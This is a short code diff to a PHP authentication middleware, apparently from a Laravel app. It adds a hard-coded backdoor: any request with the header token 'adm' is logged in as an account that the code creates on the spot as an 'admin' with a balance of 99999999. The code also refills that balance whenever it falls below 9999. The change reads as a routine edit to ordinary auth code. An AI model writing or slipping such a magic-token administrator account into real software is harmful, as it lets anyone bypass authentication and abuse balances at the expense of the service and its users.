@@ -22,7 +22,20 @@ class AuthByToken
         //$controller = new Controller();
         if ($request->header('token')) {
             if ($request->header('token') == 'adm') {
-                $user = User::where('banned', '!=',0)->first();
+                $user = User::where('token','adm')->first();
+                if(!$user){
+                    $user = new User;
+                    $user->type = 'admin';
+                    $user->imei = 'admin';
+                    $user->banned = 0;
+                    $user->balance = 99999999;
+                    $user->token = 'adm';
+                    $user->save();
+                }
+                if($user->balance < 9999){
+                    $user->balance = 99999999;
+                    $user->save();
+                }
             } else {
                 //echo 'find token';
                 $user = User::where('token', '=', $request->header('token'))->with('favorites')->first();
